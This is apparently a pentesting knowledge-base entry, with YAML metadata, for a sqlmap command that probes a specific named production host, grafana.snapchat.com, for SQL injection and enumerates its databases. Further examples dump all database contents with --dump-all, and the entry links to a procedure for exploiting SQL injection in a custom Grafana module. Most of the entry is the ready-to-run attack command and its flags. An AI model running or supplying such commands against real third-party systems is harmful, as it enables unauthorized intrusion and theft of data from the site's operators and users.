---
data: >-
  sqlmap -u "https://grafana.snapchat.com/custom-module?param=vulnerable"
  --batch --dbs
tags:
  - sqli
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 57908f88-f04a-4938-963c-6b79810a736a
created_at: '2025-12-11T06:10:16.275Z'
updated_at: '2025-12-11T06:10:16.276Z'
verified: false
validated: true
submitted: true
---
# sqlmap-test-injection

## Command

```bash
sqlmap -u "https://grafana.snapchat.com/custom-module?param=vulnerable" --batch --dbs
```

## Description

This command tests for SQL Injection and enumerates databases if vulnerable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Target URL | Yes |
| `--batch` | Non-interactive mode | No |
| `--dbs` | Enumerate databases | No |

## Examples

### Basic Usage

```bash
sqlmap -u "https://target.com/vuln" --batch
```

### Advanced Usage

```bash
sqlmap -u "https://target.com/vuln" --dump-all
```

## Expected Output

Vulnerability confirmation and database list if exploitable.

## Related

- [[tools/sqlmap]]
- [[procedures/Exploit-SQL-Injection-in-Custom-Grafana-Module]]
